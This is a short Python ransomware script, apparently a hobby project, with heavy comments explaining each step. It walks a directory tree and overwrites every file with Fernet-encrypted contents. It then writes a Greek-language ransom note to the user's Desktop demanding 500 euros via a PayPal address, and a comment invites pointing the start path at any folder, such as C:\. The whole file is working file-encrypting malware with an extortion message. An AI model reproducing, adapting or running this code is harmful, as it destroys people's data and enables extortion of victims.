import os
from cryptography.fernet import Fernet

######  RANSOMWARE CREATED BY ME ####


with open('cryptKey','rb')as k:
        key=k.read()
f=Fernet(key)
login=os.getlogin()

#THE ABOVE CODE BASICALLY OPENS THE CRYPT_KEY_FILE WHICH WAS GENERATED
#AS READ BYTES MODE AND THE CONTENTS OF THAT FILE ARE STORED IN KEY VARIABLE
#WE THEN TAKE THE USERNAME OF THE VICTIMS PC BECAUSE WE WILL NEED IT TO GET TO HIS DESKTOP LATER


#THIS FUNCTION DOES THE ENCRYPTING PART
def encryptAll(fullpath):   
#THIS FUNCTION GETS CALLED FOR EACH SUBDIRECTORY AND FILE
#BASICALLY IT READS THE ORIGINAL CONTENTS OF EACH FILE IN READ/BYTES MODE
    with open(fullpath,'rb')as original:
        ori=original.read()
    e=f.encrypt(ori)
#THE CONTENTS GET STORED IN ORI VARIABLE AND THEN ARE ENCRYPTED
#THEN WE RE OPEN THE SAME FILE BUT IN WRITE/BYTES MODE TO WRITE THE ENCRYPTED CONTENTS    
#BASICALLY ENCRYPTING EACH FILE THAT WAY    
    with open(fullpath,'wb')as encrypted_files:
        encrypted_files.write(e)

#AFTER WE ENCRYPT EVERY FILE WE THEN CREATE A README FILE
#FOR THE VICTIM IN HIS DESKTOP WHICH CONTAINS A MESSAGE. 
    with open('C:\\Users\\'+login+'\\'+'Desktop\\readme.txt','w',encoding='utf-8')as fi:
        fi.write('Τα Αρχεια Σου Κλειδωθηκαν Μονο Εγω Μπορω Να Τα Ξεκλειδωσω Εαν Προσπαθησεις Να Τα Ανοιξεις Θα Κανεις Μεγαλυτερη Ζημια Πληρωσε 500 Ευρω Στο civy@paypal.com Και Θα Τα Εχεις Πισω')


##### THE PROGRAM STARTS HERE ####
### THIS METHOD DOES THE FILE SEARCHING
def search_files():
    #THIS VARIABLE IS USED AS A STARTING POINT EX C:\
    #FEEL FREE TO CHANGE TO WHATEVER PATH YOU WANT TO START YOUR ENCRYPTING
    start_path='C:\\Users\\kounela\\Desktop\\projects\\python\\ransomware\\victim_files'
    
    #THE FOR LOOP LOOPS THROUGH EVERY ROOT_DIRECTORIE/SUBDIRECTORY AND FOR EACH IT LOOPS THROUGH ALL FILES
    #THATS WHAT THE OS.WALK DOES IT GIVES YOU EVERYTHING
    
    for root,d,files in os.walk(start_path):
    #FIRST WE START WITH THE ROOT DIRECTORIES
    #STORE THE DIRECTORIES IN A VARIABLE ROOT_DIRECTORY
        root_directory=root
    #THE SECOND FOR LOOPS THROUGH ALL THE FILES
        for f in files:
        #THEN FOR EVERY FILE IT GETS JOINED WITH ITS ROOT DIRECTORY
        #THIS IS DONE IN ORDER TO HAVE THE FULL PATH OF EVERY FILE
        #THEN THE FULL PATH GETS STORED INSIDE A VARIABLE AFTER WHICH THE ENCRYPTALL FUNCTION GETS CALLED CONTAINING THE FULL PATH                  
            full_path=os.path.join(root_directory,f)
            encryptAll(full_path)
search_files()



